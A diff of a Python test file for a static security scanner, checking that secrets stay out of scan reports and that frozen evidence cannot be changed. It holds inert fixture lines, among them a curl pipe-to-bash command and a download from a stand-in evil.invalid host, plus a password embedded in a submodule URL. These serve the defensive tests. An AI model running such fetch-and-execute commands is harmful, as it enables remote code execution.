@@ -40,6 +40,15 @@ def run() -> bool:
     def ck(n, ok):
         res.append(bool(ok)); print(f"  [{'PASS' if ok else 'FAIL'}] {n}")
 
+    def _raises(exc, fn):
+        try:
+            fn()
+        except exc:
+            return True
+        except Exception as ex:                    # wrong exception type is a FAIL, not a pass
+            print(f"      (raised {type(ex).__name__}: {ex})")
+        return False
+
     # ── (1) pipeline is typed + ordered ──
     ids = [s.id for s in c.PIPELINE]
     ck("PIPELINE is a tuple of frozen StepDef with unique ids",
@@ -190,6 +199,45 @@ def run() -> bool:
        e5.certification == Verdict.SUSPICIOUS and ASIA_ID not in hist and LONG_SECRET[:20] not in hist
        and not any(runtimes.EXECUTED.values()))
 
+    # ── (9c) H1 round 3: the snippet is bounded by MATCH LENGTH, not by the label ──
+    # (inert scan input: a CUSTOM auth header whose value redact()'s fixed header-name list cannot know,
+    #  sitting INSIDE a greedy line-spanning match — the download row and the core pipe-to-shell row)
+    CUSTOM = "K7m" * 40                              # 120 chars → 101 distinct 20-char windows
+    dl = c.run_static(_inv({**CLEAN, "get.sh": f'curl -H "X-Custom-Auth: {CUSTOM}" https://cdn.evil.invalid/x.tar.gz\n'
+                                               f'curl -sS "https://cdn.evil.invalid/i.sh?t={CUSTOM}" | bash\n'}))
+    dl_js = c.to_json(dl)
+    db = dl.step("downloaded_binaries")
+    ck("H1: a greedy match that CONTAINS a custom-auth secret (curl…archive, curl…|bash) emits NO snippet — "
+       "not one of the 101 20-char windows of the secret reaches the JSON report — while the step still FAILs "
+       "with path + line + label",
+       not any(CUSTOM[i:i + 20] in dl_js for i in range(len(CUSTOM) - 19))
+       and db.status == c.StepStatus.FAIL and {f.path for f in db.findings} == {"get.sh"} and len(db.findings) >= 2
+       and all(f.line > 0 and "withheld" in f.detail for f in db.findings) and dl.verdict == Verdict.REJECTED)
+    ck("H1: the bound is match LENGTH, not blanket withholding — a short match still carries its redacted snippet",
+       any("…" in f.detail for f in c.run_static(_inv({**CLEAN, "t.py": "x = telemetry\n"})).step("telemetry").findings)
+       and c._MAX_MATCH <= 40)
+
+    # ── (9d) H3: the deep freeze must not break redaction — the frozen mappings are dict SUBCLASSES ──
+    GM_PW = "SuperSecretPw"      # inert: a password embedded in a .gitmodules URL (scan input, never used)
+    gm = c.run_static(_inv({**CLEAN, ".gitmodules": f'[submodule "x"]\n\turl = https://u:{GM_PW}@evil.invalid/x.git\n'}))
+    gm_ev = gm.step("submodules").evidence
+    catalog.record_verdict(e5, Verdict.SUSPICIOUS, actor="kai", reason="submodule urls",
+                           evidence={"submodules": gm_ev})
+    ck("H3: a step's frozen evidence is STILL a real dict, so task_resolver.redact traverses it — the "
+       ".gitmodules password is redacted and never reaches the append-only catalog history",
+       isinstance(gm_ev, dict) and GM_PW in json.dumps(gm_ev)
+       and GM_PW not in json.dumps(c.redact(gm_ev)) and GM_PW not in json.dumps(e5.history, default=str)
+       and not any(GM_PW in f.detail for f in gm.step("submodules").findings))
+    ck("H3: the freeze still holds (every mutating method raises TypeError), the honesty ledger stays False, "
+       "and dataclasses.asdict(report) now SUCCEEDS",
+       all(_raises(TypeError, fn) for fn in (lambda: _write(gm_ev, "urls", []), lambda: gm_ev.update(urls=[]),
+                                             lambda: gm_ev.pop("urls"), lambda: gm_ev.clear(),
+                                             lambda: gm_ev.setdefault("x", 1), lambda: gm.executed.pop("build"),
+                                             lambda: _write(gm.executed, "build", True)))
+       and gm.executed["build"] is False and not any(gm.executed.values())
+       and dataclasses.asdict(gm)["executed"]["build"] is False
+       and dataclasses.asdict(gm)["steps"][0]["status"] is c.StepStatus.UNVERIFIED)
+
     # ── (10) coordination with catalog.py: the report is evidence for the §113 lifecycle, never an authority ──
     e = catalog.get("virtme-ng", catalog.initial_catalog())
     catalog.advance(e, LabState.SOURCE_VERIFIED, actor="operator", reason="t", evidence={"verified_at": "t"})
@@ -200,16 +248,6 @@ def run() -> bool:
     ck("a REJECTED static report drives STATIC_REVIEW → REJECTED via catalog.advance (audited, evidence = report)",
        e.state == LabState.REJECTED and rec["evidence"]["verdict"] == "REJECTED" and e.certification == Verdict.UNVERIFIED)
     CLEAN_V = Verdict.NO_MALICIOUS_BEHAVIOR_DETECTED_IN_CERTIFIED_SCOPE
-
-    def _raises(exc, fn):
-        try:
-            fn()
-        except exc:
-            return True
-        except Exception as ex:                    # wrong exception type is a FAIL, not a pass
-            print(f"      (raised {type(ex).__name__}: {ex})")
-        return False
-
     ck("record_verdict refused outside SECURITY_REVIEW even for the operator with a real report (the report cannot self-certify)",
        _raises(ValueError, lambda: catalog.record_verdict(e, CLEAN_V, actor="operator", reason="t", evidence=r1.to_dict()))
        and e.certification == Verdict.UNVERIFIED)
@@ -226,8 +264,8 @@ def run() -> bool:
        and _raises(AttributeError, lambda: rep.steps.append(None))
        and rep.scope == "STATIC_ONLY" and rep.verdict == Verdict.REJECTED
        and rep.step("qemu_vm_exec").status == c.StepStatus.SKIPPED)
-    ck("L1: the freeze is DEEP — executed[] and a step's evidence[] are MappingProxyType: in-place mutation "
-       "raises TypeError and the honesty ledger stays False",
+    ck("L1: the freeze is DEEP — executed[] and a step's evidence[] are mutation-refusing dict subclasses: "
+       "in-place mutation raises TypeError and the honesty ledger stays False",
        _raises(TypeError, lambda: _write(rep.executed, "build", True))
        and _raises(TypeError, lambda: _write(rep.step("file_inventory").evidence, "files", 0))
        and rep.executed["build"] is False and not any(rep.executed.values())
